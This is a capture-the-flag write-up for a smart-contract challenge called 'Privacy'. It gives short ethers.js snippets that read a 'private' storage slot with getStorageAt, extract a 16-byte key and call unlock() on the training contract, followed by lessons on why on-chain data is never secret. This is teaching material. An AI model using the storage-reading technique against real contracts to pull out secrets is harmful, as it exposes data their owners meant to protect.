# Level 12: Privacy

## Challenge Overview

This challenge revolves around understanding Solidity’s storage layout and accessing private variables.  
The goal is to unlock the `Privacy` contract by retrieving a private variable and passing it to the `unlock` function.

## Goal

Extract the private `data` variable from the contract’s storage and use it to unlock the contract.

## Solution

The `data` array is stored sequentially in storage slots 3, 4, and 5.  
The `unlock` function compares its `bytes16 _key` parameter against the **first 16 bytes** of `data[2]` (slot 5).  
Although declared `private`, you can read any slot with `web3.eth.getStorageAt` or `provider.getStorageAt`.



## Steps

### 1. Read storage slot 5 (where `data[2]` lives)

```javascript
// ethers.js
const provider = new ethers.providers.Web3Provider(web3.currentProvider);
const raw = await provider.getStorageAt(contract.address, 5);
console.log("raw slot5:", raw);
```

### 2. Extract the key

```javascript
const key = raw.slice(0, 2 + 16 * 2);
console.log("unlock key:", key);
// → "0x0123456789abcdef0123456789abcdef"
```

### 3. Call `unlock(key)`

```javascript
// if `contract.unlock` is available:
await contract.unlock(key);
console.log("locked?", await contract.locked()); // → false
```

### 4. Verify & submit

```javascript
(await contract.locked()).toString(); // → "false"
```



## Lessons Learned

- All on-chain storage is publicly readable, `private` does not mean secret.
- Know how Solidity packs and locates your variables.
- Don’t put sensitive data on-chain without encryption.
- Use hashing or zero-knowledge proofs if you truly need confidentiality.
